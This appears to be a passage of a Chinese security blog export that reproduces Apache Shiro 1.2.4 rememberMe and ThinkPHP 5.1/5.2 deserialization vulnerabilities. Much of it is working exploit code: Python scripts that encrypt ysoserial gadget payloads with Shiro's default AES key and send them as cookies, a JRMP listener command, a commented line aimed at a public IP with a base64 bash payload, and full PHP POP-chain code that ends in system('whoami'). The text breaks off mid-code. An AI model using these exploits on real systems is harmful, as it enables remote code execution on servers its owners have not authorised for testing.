'CommonsCollections2', command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == '__main__': #http://www.jackson-t.ca/runtime-exec-payloads.html poc('http://127.0.0.1:8080', 'open /Applications/Calculator.app') 动态分析环境搭建 123git clone https://github.com/apache/shiro.gitgit checkout shiro-root-1.2.4cd ./shiro/samples/web mac 安装jdk6 https://juejin.im/post/5d550c5d51882504fb3022f7 为了能动态调试需要在shiro/samples/web中添加 123456789101112131415161718192021&lt;!-- 需要设置编译的版本 --&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;!-- 这里需要将jstl设置为1.2 --&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt;&lt;dependencies&gt; 123456789101112131415161718&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;toolchains xmlns=&quot;http://maven.apache.org/TOOLCHAINS/1.1.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd&quot;&gt;&lt;!--插入下面代码--&gt; &lt;toolchain&gt; &lt;type&gt;jdk&lt;/type&gt; &lt;provides&gt; &lt;version&gt;1.6&lt;/version&gt; &lt;vendor&gt;sun&lt;/vendor&gt; &lt;/provides&gt; &lt;configuration&gt; &lt;!--这里是你安装jdk的文件目录--&gt; &lt;jdkHome&gt;/Library/Java/JavaVirtualMachines/1.6.0.jdk/&lt;/jdkHome&gt; &lt;/configuration&gt; &lt;/toolchain&gt;&lt;/toolchains&gt; Run Edit Configurations 添加TomcatServer(Local) Server中配置Tomcat路径 Deployment中添加Artifact 选择sample-web:war exploded 代码分析 根据官网的叙述比较清楚了 加密 convertPrincipalsToBytes 序列化具体 加密具体 加密用到encryptionCipherKey在构造方法中确定，其实就是DEFAULT_CIPHER_KEY_BYTES 加密用到的cipherService在对象初始化的时候确定为Aes加密 调用栈 解密 getRememberedPrincipals 反序列化的起点 调用栈 漏洞的原生利用 shiro自带的包是commons-collections3.2.1 其实原生情况下直接用ysoserial打会出现报错 报错的原因是 最开始的可以打成功的原因是，为了方便进行复现，搭建环境时手动添加了ysoserial支持的commons-collections4，所以复现起来才和喝水一样简单（橘子师傅原话） 解决这种问题的办法是使用JRMP，至于原因应该是 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections5 'touch /tmp/hack_shiro_jrmp' 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#coding:utf-8import osimport reimport base64import uuidimport subprocessimport requestsfrom Crypto.Cipher import AESJAR_FILE = '/Users/cengsiqi/Desktop/pentest/ysoserial-0.0.6-SNAPSHOT-all.jar'def poc(url, JRMPServerIp): if '://' not in url: target = 'https://%s' % url if ':443' in url else 'http://%s' % url else: target = url try: payload = generator(JRMPServerIp, JAR_FILE) # 生成payload r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10) # 发送验证请求 print r.text except Exception, e: pass return Falsedef generator(JRMPServerIp, fp): if not os.path.exists(fp): raise Exception('jar file not found!') #java -jar ysoserial-master-SNAPSHOT.jar JRMPClient '1.2.3.4:12345' popen = subprocess.Popen(['java', '-jar', fp, 'JRMPClient', JRMPServerIp], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == '__main__': #http://www.jackson-t.ca/runtime-exec-payloads.html #poc('http://47.106.182.92:8080/', 'bash -c {echo,ZWNobyBgd2hvYW1pYCA+IC91c3IvbG9jYWwvdG9tY2F0L3dlYmFwcHMvUk9PVC9oYWNrLmpzcA==}|{base64,-d}|{bash,-i}') poc('http://127.0.0.1:8888/samples_web_war_exploded/', '127.0.0.1:12345') 然而本地测试的时候并未复现中，应该是gadget的问题，因为在加了commons-conllections4.0的环境用ysoserial的CommonsCollections2就可以成功。难道是环境没装好？ 后来仔细看了一下，确实是环境的问题，具体原因是打包成war的时候只会把compile和runtime的打包，而test的属于开发阶段需要使用的，从而不会打进去，而这里common-conllectons恰好属于test。所以生成环境中根本没有common-conllectons，因此是不可能打成功的。 此外注意到原生shiro，还自带CommonsBeanutils1.8.3，而CommonsBeanutils历史上是有gadget。 改了ysoserial的pom CommonsBeanutils成1.8.3又爆了新的错误 1234Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator] from the thread context, current, or system/application ClassLoaders. All heuristics have been exhausted. Class could not be found. at org.apache.shiro.util.ClassUtils.forName(ClassUtils.java:148) at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53) ... 51 more 所以立个flag：纯原生的shiro只是一个反序列化的触发点，没有完整gadget。因此需要结合其它依赖shiro的项目才有可能达到RCE的效果（比如jeecms） 其他 解密脚本 12345678910111213141516# pip install pycryptoimport sysimport base64from Crypto.Cipher import AESdef decode_rememberme(cookie): key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC cipher = base64.b64decode(cookie) IV = cipher[0:16] encryptor = AES.new(base64.b64decode(key), mode, IV=IV) remember_bin = encryptor.decrypt(cipher[16:]) return remember_binif __name__ == '__main__': cookie=&quot;&quot;&quot;&quot;&quot;&quot; print(decode_rememberme(cookie)[16:]) 1python decrypt.py cGhyYWNrY3RmREUhfiMkZA== | xxd DNS gadget验证漏洞 1java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://yoursite 获取全版本解决SUID问题 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#coding:utf-8import requestsimport subprocessimport uuidimport base64import osfrom subprocess import Popen,PIPEfrom xml.dom.minidom import *from Crypto.Cipher import AESrepo_url = &quot;http://uk.maven.org/maven2/commons-beanutils/commons-beanutils/maven-metadata.xml&quot;mvn_home = &quot;/Users/cengsiqi/.m2/repository&quot;yso_path = &quot;/Users/cengsiqi/Desktop/pentest/ysoserial/target/classes&quot;gadget = &quot;CommonsBeanutils1&quot;command = 'touch /tmp/hack_shiro_CommonsBeanutils1'#key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;key = &quot;4AvVhmFLUs0KTA3Kprsdag==&quot;target = &quot;http://172.16.247.129:8080/&quot;iv = uuid.uuid4().bytesres = requests.get(repo_url)html = res.contentroot = parseString(html.decode(&quot;utf-8&quot;))groupId = root.getElementsByTagName(&quot;groupId&quot;)[0].firstChild.dataartifactId = root.getElementsByTagName(&quot;artifactId&quot;)[0].firstChild.dataprint(groupId, artifactId)def encode(payload): BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() mode = AES.MODE_CBC encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(payload) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextfor i in root.getElementsByTagName(&quot;version&quot;): version = i.firstChild.data if version.find('-pre') &gt; -1: continue jar_path = mvn_home + '/' + groupId.replace('.', '/') + '/' + artifactId + '/' + version + '/' + artifactId + '-' + version + '.jar' print(jar_path) mvncmd = &quot;mvn dependency:get -DremoteRepositories=http://repo1.maven.org/maven2/ -DgroupId=%s -DartifactId=%s -Dversion=%s&quot; \\ % (groupId, artifactId, version) child = Popen(mvncmd, shell=True, stdout=PIPE, stderr=PIPE) child.wait() #yso_path, mvn_home, jar_path, gadget, command cmd2 = &quot;{0}:{2}:{1}/net/iharder/base64/2.3.9/base64-2.3.9.jar:{1}/commons-io/commons-io/2.6/commons-io-2.6.jar:{1}/org/reflections/reflections/0.9.9/reflections-0.9.9.jar:{1}/com/google/guava/guava/15.0/guava-15.0.jar:{1}/com/google/code/findbugs/annotations/2.0.1/annotations-2.0.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api/2.1.1/shrinkwrap-resolver-api-2.1.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi/2.1.1/shrinkwrap-resolver-spi-2.1.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven/2.1.1/shrinkwrap-resolver-api-maven-2.1.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven/2.1.1/shrinkwrap-resolver-spi-maven-2.1.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven-archive/2.1.1/shrinkwrap-resolver-api-maven-archive-2.1.1.jar:{1}/org/jboss/shrinkwrap/shrinkwrap-api/1.2.1/shrinkwrap-api-1.2.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven/2.1.1/shrinkwrap-resolver-impl-maven-2.1.1.jar:{1}/org/eclipse/aether/aether-api/0.9.0.M2/aether-api-0.9.0.M2.jar:{1}/org/eclipse/aether/aether-impl/0.9.0.M2/aether-impl-0.9.0.M2.jar:{1}/org/eclipse/aether/aether-spi/0.9.0.M2/aether-spi-0.9.0.M2.jar:{1}/org/eclipse/aether/aether-util/0.9.0.M2/aether-util-0.9.0.M2.jar:{1}/org/eclipse/aether/aether-connector-wagon/0.9.0.M2/aether-connector-wagon-0.9.0.M2.jar:{1}/org/apache/maven/maven-aether-provider/3.1.1/maven-aether-provider-3.1.1.jar:{1}/org/apache/maven/maven-model/3.1.1/maven-model-3.1.1.jar:{1}/org/apache/maven/maven-model-builder/3.1.1/maven-model-builder-3.1.1.jar:{1}/org/codehaus/plexus/plexus-component-annotations/1.5.5/plexus-component-annotations-1.5.5.jar:{1}/org/apache/maven/maven-repository-metadata/3.1.1/maven-repository-metadata-3.1.1.jar:{1}/org/apache/maven/maven-settings/3.1.1/maven-settings-3.1.1.jar:{1}/org/apache/maven/maven-settings-builder/3.1.1/maven-settings-builder-3.1.1.jar:{1}/org/codehaus/plexus/plexus-interpolation/1.19/plexus-interpolation-1.19.jar:{1}/org/codehaus/plexus/plexus-utils/3.0.15/plexus-utils-3.0.15.jar:{1}/org/sonatype/plexus/plexus-sec-dispatcher/1.3/plexus-sec-dispatcher-1.3.jar:{1}/org/sonatype/plexus/plexus-cipher/1.4/plexus-cipher-1.4.jar:{1}/org/apache/maven/wagon/wagon-provider-api/2.6/wagon-provider-api-2.6.jar:{1}/org/apache/maven/wagon/wagon-file/2.6/wagon-file-2.6.jar:{1}/org/apache/maven/wagon/wagon-http-lightweight/2.6/wagon-http-lightweight-2.6.jar:{1}/org/apache/maven/wagon/wagon-http-shared/2.6/wagon-http-shared-2.6.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven-archive/2.1.1/shrinkwrap-resolver-impl-maven-archive-2.1.1.jar:{1}/org/jboss/shrinkwrap/shrinkwrap-impl-base/1.2.1/shrinkwrap-impl-base-1.2.1.jar:{1}/org/jboss/shrinkwrap/shrinkwrap-spi/1.2.1/shrinkwrap-spi-1.2.1.jar:{1}/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven-archive/2.1.1/shrinkwrap-resolver-spi-maven-archive-2.1.1.jar:{1}/org/eclipse/sisu/org.eclipse.sisu.plexus/0.0.0.M5/org.eclipse.sisu.plexus-0.0.0.M5.jar:{1}/org/sonatype/sisu/sisu-guice/3.1.0/sisu-guice-3.1.0-no_aop.jar:{1}/org/eclipse/sisu/org.eclipse.sisu.inject/0.0.0.M5/org.eclipse.sisu.inject-0.0.0.M5.jar:{1}/org/codehaus/plexus/plexus-compiler-javac/2.3/plexus-compiler-javac-2.3.jar:{1}/org/codehaus/plexus/plexus-compiler-api/2.3/plexus-compiler-api-2.3.jar:{1}/org/javassist/javassist/3.19.0-GA/javassist-3.19.0-GA.jar:{1}/commons-codec/commons-codec/1.9/commons-codec-1.9.jar:{1}/org/jenkins-ci/main/remoting/2.55/remoting-2.55.jar:{1}/org/jenkins-ci/constant-pool-scanner/1.2/constant-pool-scanner-1.2.jar:{1}/org/jboss/logging/jboss-logging/3.3.0.Final/jboss-logging-3.3.0.Final.jar:{1}/org/jboss/remoting/jboss-remoting/4.0.19.Final/jboss-remoting-4.0.19.Final.jar:{1}/org/jboss/xnio/xnio-api/3.3.4.Final/xnio-api-3.3.4.Final.jar:{1}/org/jboss/jboss-common-core/2.5.0.Final/jboss-common-core-2.5.0.Final.jar:{1}/org/jboss/xnio/xnio-nio/3.3.4.Final/xnio-nio-3.3.4.Final.jar:{1}/org/jboss/sasl/jboss-sasl/1.0.5.Final/jboss-sasl-1.0.5.Final.jar:{1}/org/jboss/remotingjmx/remoting-jmx/2.0.1.Final/remoting-jmx-2.0.1.Final.jar:{1}/org/jboss/logging/jboss-logging-processor/1.2.0.Final/jboss-logging-processor-1.2.0.Final.jar:{1}/org/jboss/jdeparser/jdeparser/1.0.0.Final/jdeparser-1.0.0.Final.jar:{1}/org/jboss/marshalling/jboss-marshalling/1.4.10.Final/jboss-marshalling-1.4.10.Final.jar:{1}/org/jboss/marshalling/jboss-marshalling-river/1.4.10.Final/jboss-marshalling-river-1.4.10.Final.jar:{1}/commons-collections/commons-collections/3.1/commons-collections-3.1.jar:{1}/org/beanshell/bsh/2.0b5/bsh-2.0b5.jar:{1}/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar:{1}/commons-logging/commons-logging/1.1.1/commons-logging-1.1.1.jar:{1}/org/apache/commons/commons-collections4/4.0/commons-collections4-4.0.jar:{1}/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar:{1}/org/springframework/spring-core/4.1.4.RELEASE/spring-core-4.1.4.RELEASE.jar:{1}/org/springframework/spring-beans/4.1.4.RELEASE/spring-beans-4.1.4.RELEASE.jar:{1}/org/hibernate/hibernate-core/4.3.11.Final/hibernate-core-4.3.11.Final.jar:{1}/org/jboss/logging/jboss-logging-annotations/1.2.0.Beta1/jboss-logging-annotations-1.2.0.Beta1.jar:{1}/org/jboss/spec/javax/transaction/jboss-transaction-api_1.2_spec/1.0.0.Final/jboss-transaction-api_1.2_spec-1.0.0.Final.jar:{1}/dom4j/dom4j/1.6.1/dom4j-1.6.1.jar:{1}/xml-apis/xml-apis/1.0.b2/xml-apis-1.0.b2.jar:{1}/org/hibernate/common/hibernate-commons-annotations/4.0.5.Final/hibernate-commons-annotations-4.0.5.Final.jar:{1}/org/hibernate/javax/persistence/hibernate-jpa-2.1-api/1.0.0.Final/hibernate-jpa-2.1-api-1.0.0.Final.jar:{1}/antlr/antlr/2.7.7/antlr-2.7.7.jar:{1}/org/jboss/jandex/1.1.0.Final/jandex-1.1.0.Final.jar:{1}/org/springframework/spring-aop/4.1.4.RELEASE/spring-aop-4.1.4.RELEASE.jar:{1}/aopalliance/aopalliance/1.0/aopalliance-1.0.jar:{1}/net/sf/json-lib/json-lib/2.4/json-lib-2.4-jdk15.jar:{1}/commons-lang/commons-lang/2.5/commons-lang-2.5.jar:{1}/net/sf/ezmorph/ezmorph/1.0.6/ezmorph-1.0.6.jar:{1}/commons-fileupload/commons-fileupload/1.3/commons-fileupload-1.3.jar:{1}/org/apache/wicket/wicket-util/6.23.0/wicket-util-6.23.0.jar:{1}/org/apache/shiro/shiro-core/1.4.0/shiro-core-1.4.0.jar:{1}/org/apache/shiro/shiro-lang/1.4.0/shiro-lang-1.4.0.jar:{1}/org/apache/shiro/shiro-cache/1.4.0/shiro-cache-1.4.0.jar:{1}/org/apache/shiro/shiro-crypto-hash/1.4.0/shiro-crypto-hash-1.4.0.jar:{1}/org/apache/shiro/shiro-crypto-core/1.4.0/shiro-crypto-core-1.4.0.jar:{1}/org/apache/shiro/shiro-crypto-cipher/1.4.0/shiro-crypto-cipher-1.4.0.jar:{1}/org/apache/shiro/shiro-config-core/1.4.0/shiro-config-core-1.4.0.jar:{1}/org/apache/shiro/shiro-config-ogdl/1.4.0/shiro-config-ogdl-1.4.0.jar:{1}/org/apache/shiro/shiro-event/1.4.0/shiro-event-1.4.0.jar:~/.m2/repository/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar:{1}/com/mchange/mchange-commons-java/0.2.11/mchange-commons-java-0.2.11.jar:{1}/javax/servlet/javax.servlet-api/3.1.0/javax.servlet-api-3.1.0.jar:{1}/org/apache/myfaces/core/myfaces-impl/2.2.9/myfaces-impl-2.2.9.jar:{1}/org/apache/myfaces/core/myfaces-api/2.2.9/myfaces-api-2.2.9.jar:{1}/org/apache/geronimo/specs/geronimo-atinject_1.0_spec/1.0/geronimo-atinject_1.0_spec-1.0.jar:{1}/commons-digester/commons-digester/1.8/commons-digester-1.8.jar:{1}/xalan/xalan/2.7.2/xalan-2.7.2.jar:{1}/xalan/serializer/2.7.2/serializer-2.7.2.jar:{1}/rome/rome/1.0/rome-1.0.jar:{1}/jdom/jdom/1.0/jdom-1.0.jar:{1}/org/python/jython-standalone/2.5.2/jython-standalone-2.5.2.jar:{1}/rhino/js/1.7R2/js-1.7R2.jar:{1}/javassist/javassist/3.12.0.GA/javassist-3.12.0.GA.jar:{1}/org/jboss/weld/weld-core/1.1.33.Final/weld-core-1.1.33.Final.jar:{1}/org/jboss/weld/weld-api/1.1.Final/weld-api-1.1.Final.jar:{1}/org/jboss/weld/weld-spi/1.1.Final/weld-spi-1.1.Final.jar:{1}/javax/annotation/jsr250-api/1.0/jsr250-api-1.0.jar:{1}/org/jboss/spec/javax/interceptor/jboss-interceptors-api_1.1_spec/1.0.0.Beta1/jboss-interceptors-api_1.1_spec-1.0.0.Beta1.jar:{1}/org/slf4j/slf4j-ext/1.7.2/slf4j-ext-1.7.2.jar:{1}/ch/qos/cal10n/cal10n-api/0.7.7/cal10n-api-0.7.7.jar:{1}/org/jboss/interceptor/jboss-interceptor-core/2.0.0.Final/jboss-interceptor-core-2.0.0.Final.jar:{1}/org/jboss/interceptor/jboss-interceptor-spi/2.0.0.Final/jboss-interceptor-spi-2.0.0.Final.jar:{1}/javax/enterprise/cdi-api/1.0-SP1/cdi-api-1.0-SP1.jar:{1}/org/jboss/interceptor/jboss-interceptor-api/1.1/jboss-interceptor-api-1.1.jar:{1}/javax/inject/javax.inject/1/javax.inject-1.jar:{1}/javax/interceptor/javax.interceptor-api/3.1/javax.interceptor-api-3.1.jar:{1}/org/slf4j/slf4j-api/1.7.21/slf4j-api-1.7.21.jar:{1}/org/clojure/clojure/1.8.0/clojure-1.8.0.jar:{1}/com/vaadin/vaadin-server/7.7.14/vaadin-server-7.7.14.jar:{1}/com/vaadin/vaadin-sass-compiler/0.9.13/vaadin-sass-compiler-0.9.13.jar:{1}/org/w3c/css/sac/1.3/sac-1.3.jar:{1}/com/vaadin/external/flute/flute/1.3.0.gg2/flute-1.3.0.gg2.jar:{1}/com/vaadin/vaadin-shared/7.7.14/vaadin-shared-7.7.14.jar:{1}/org/jsoup/jsoup/1.8.3/jsoup-1.8.3.jar:{1}/org/mortbay/jasper/apache-el/8.0.27/apache-el-8.0.27.jar:{1}/com/nqzero/permit-reflect/0.3/permit-reflect-0.3.jar:{1}/com/nqzero/permit-reflect/0.3/permit-reflect-0.3.jar&quot;.format(yso_path, mvn_home, jar_path) print(version) popen = subprocess.Popen(['java', '-cp', cmd2, &quot;ysoserial.GeneratePayload&quot;, gadget, command],stdout=subprocess.PIPE) payload = popen.stdout.read() base64_ciphertext = encode(payload) try: r = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=10) JAR_FILE = '/Users/cengsiqi/Desktop/pentest/ysoserial-0.0.6-SNAPSHOT-all.jar' #r = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=10, proxies={'http':'127.0.0.1:8080'}) except Exception as e: print(e) 参考 https://paper.seebug.org/shiro-rememberme-1-2-4/ https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html https://blog.zsxsoft.com/post/35 https://www.cnblogs.com/Ahanu/p/5051090.html http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html","link":"/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/"},{"title":"thinkphp 反序列化系列gadget 复现","text":"环境准备 安装composer 123curl -sS https://getcomposer.org/installer | phpmv composer.phar /usr/local/bin/composercomposer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ 安装对应版本的tp后，修改index controller的index方法 12345public function index(){ unserialize($_POST['payload']); return &quot;Over&quot;;} ThinkPHP5.1.X 安装tp 1234composer create-project --prefer-dist topthink/think tp5137cd tp5137vim composer.json # 把&quot;topthink/framework&quot;: &quot;5.1.*&quot;改成&quot;topthink/framework&quot;: &quot;5.1.37&quot;composer update think\\process\\pipes; think\\model\\concern\\Conversion 要进入红框逻辑 基本上扩展到调用任意类的任意方法 filter 所以如果实在要用input，就需要迂回即查找有哪些方法内部使用了input，可以找到param。 不过 $name参数这里是刚才合并数组后第一个参数$this传回到input第二个参数后，会强制类型转换成string。 所以要强行用input就要继续找其它调用input的方法，或者调用param的方法。 这样input的第一个参数和第二个参数都可控了。 最后的payload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313&lt;?php namespace think\\process\\pipes { class Windows { private $files = []; private $fileHandles = []; public function __destruct() { $this-&gt;close(); $this-&gt;removeFiles(); } public function close() { foreach ($this-&gt;fileHandles as $handle) { fclose($handle); } $this-&gt;fileHandles = []; } private function removeFiles() { foreach ($this-&gt;files as $filename) { if (file_exists($filename)) { @unlink($filename); } } $this-&gt;files = []; } public function setFile($value){ $this-&gt;files[] = $value; } } } namespace think\\model\\concern { trait Conversion{ protected $append = ['key' =&gt; array()]; public function toArray() { $item = []; $hasVisible = false; if (!empty($this-&gt;append)) { foreach ($this-&gt;append as $key =&gt; $name) { if (is_array($name)) { $relation = $this-&gt;getRelation($key); if (!$relation) { $relation = $this-&gt;getAttr($key); $relation-&gt;visible($name); } $item[$key] = $relation-&gt;append($name)-&gt;toArray(); } } } return $item; } public function toJson($options = JSON_UNESCAPED_UNICODE) { return json_encode($this-&gt;toArray(), $options); } public function __toString() { return $this-&gt;toJson(); } } trait RelationShip{ private $relation = []; public function getRelation($name = null) { if (is_null($name)) { return $this-&gt;relation; } elseif (array_key_exists($name, $this-&gt;relation)) { return $this-&gt;relation[$name]; } return; } public function setRelation($key, $relation){ $this-&gt;relation[$key] = $relation; } } trait Attribute{ private $filter; private $data = ['key' =&gt; '']; public function getAttr($name, &amp;$item = null){ try { $notFound = false; $value = $this-&gt;getData($name); } catch (InvalidArgumentException $e) { $notFound = true; $value = null; } return $value; } public function getData($name = null) { if (is_null($name)) { return $this-&gt;data; } elseif (array_key_exists($name, $this-&gt;data)) { return $this-&gt;data[$name]; } elseif (array_key_exists($name, $this-&gt;relation)) { return $this-&gt;relation[$name]; } throw new InvalidArgumentException('property not exists:' . static::class . '-&gt;' . $name); } public function setData($key, $value) { $this-&gt;data[$key] = $value; } } } namespace think{ class Request{ protected $mergeParam = True; protected $hook = ['visible' =&gt; '']; protected $param = ['payload'=&gt;array('whoami')]; //input的第一个参数 protected $config = ['var_ajax' =&gt; 'payload']; //var_ajax所对应值是input的第二个参数 protected $filter = ['system']; public function __call($method, $args){ #var_dump($this-&gt;hook[$method]); if (array_key_exists($method, $this-&gt;hook)) { array_unshift($args, $this); return call_user_func_array($this-&gt;hook[$method], $args); } throw new Exception('method not exists:' . static::class . '-&gt;' . $method); } public function input($data = [], $name = '', $default = null, $filter = '') { if (false === $name) { return $data; } $name = (string) $name; if ('' != $name) { if (strpos($name, '/')) { list($name, $type) = explode('/', $name); } $data = $this-&gt;getData($data, $name); if (is_null($data)) { return $default; } if (is_object($data)) { return $data; } } $filter = $this-&gt;getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, 'filterValue'], $filter); if (version_compare(PHP_VERSION, '7.1.0', '&lt;')) { $this-&gt;arrayReset($data); } } else { $this-&gt;filterValue($data, $name, $filter); } } protected function getData(array $data, $name) { foreach (explode('.', $name) as $val) { if (isset($data[$val])) { $data = $data[$val]; } else { return; } } return $data; } protected function getFilter($filter, $default) { if (is_null($filter)) { $filter = []; } else { $filter = $filter ?: $this-&gt;filter; if (is_string($filter) &amp;&amp; false === strpos($filter, '/')) { $filter = explode(',', $filter); } else { $filter = (array) $filter; } } $filter[] = $default; return $filter; } private function filterValue(&amp;$value, $key, $filters) { #($filters, $value); $default = array_pop($filters); foreach ($filters as $filter) { if (is_callable($filter)) { $value = call_user_func($filter, $value); } } return $value; } public function param($name = '', $default = null, $filter = '') { if (!$this-&gt;mergeParam) { $method = $this-&gt;method(true); switch ($method) { case 'POST': $vars = $this-&gt;post(false); break; case 'PUT': case 'DELETE': case 'PATCH': $vars = $this-&gt;put(false); break; default: $vars = []; } $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false)); $this-&gt;mergeParam = true; } if (true === $name) { // 获取包含文件上传信息的数组 $file = $this-&gt;file(); $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param; return $this-&gt;input($data, '', $default, $filter); } return $this-&gt;input($this-&gt;param, $name, $default, $filter); } public function isAjax($ajax = false) { $value = $this-&gt;server('HTTP_X_REQUESTED_WITH'); $result = 'xmlhttprequest' == strtolower($value) ? true : false; if (true === $ajax) { return $result; } $result = $this-&gt;param($this-&gt;config['var_ajax']) ? true : $result; $this-&gt;mergeParam = false; return $result; } public function server($name = '', $default = null) { if (empty($name)) { return $this-&gt;server; } else { $name = strtoupper($name); } return isset($this-&gt;server[$name]) ? $this-&gt;server[$name] : $default; } public function setHook($value){ $this-&gt;hook['visible'] = $value; } } abstract class Model { use model\\concern\\Attribute; use model\\concern\\RelationShip; use model\\concern\\Conversion; } } namespace think\\model { use think\\Model; class Pivot extends Model{} } namespace { $request = new think\\Request; $request-&gt;setHook(array($request, 'isAjax')); $conversion = new think\\model\\Pivot(); $conversion-&gt;setData('key', $request); $windows = new think\\process\\pipes\\Windows(); $windows-&gt;setFile($conversion); echo urlencode(serialize($windows)); } ThinkPHP5.2.X 123composer create-project topthink/think=5.2.x-dev tp52xcd tp52x./think run 在复现在时候看到文章分析说tp5.2.x里面的$relation-&gt;visible($name);被删除掉了，所以没法用tp5.1.x的链。个人感觉其实说的不对，如下图所示，它还在只是被封装到了另外一个函数里面，变量依然可控，真正的原因应该是 Request 类的 __call 方法被被移除了。 至此，tp5.1和tp5.2从这里开始分叉，tp5.2.x就下来用的gadget是toArray中的getAttr 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204&lt;?php namespace think\\process\\pipes { class Windows { private $files = []; private $fileHandles = []; public function __destruct() { $this-&gt;close(); $this-&gt;removeFiles(); } public function close() { foreach ($this-&gt;fileHandles as $handle) { fclose($handle); } $this-&gt;fileHandles = []; } private function removeFiles() { foreach ($this-&gt;files as $filename) { if (file_exists($filename)) { @unlink($filename); } } $this-&gt;files = []; } public function setFile($value){ $this-&gt;files[] = $value; } } } namespace think\\model\\concern { trait Conversion{ protected $visable = ['key' =&gt; 'value']; public function toArray() { $item = []; $hasVisible = false; foreach ($this-&gt;visible as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;visible[$relation][] = $name; } else { $this-&gt;visible[$val] = true; $hasVisible = true; } unset($this-&gt;visible[$key]); } } foreach ($this-&gt;hidden as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;hidden[$relation][] = $name; } else { $this-&gt;hidden[$val] = true; } unset($this-&gt;hidden[$key]); } } // 合并关联数据 $data = array_merge($this-&gt;data, $this-&gt;relation); foreach ($data as $key =&gt; $val) { if ($val instanceof Model || $val instanceof ModelCollection) { // 关联模型对象 if 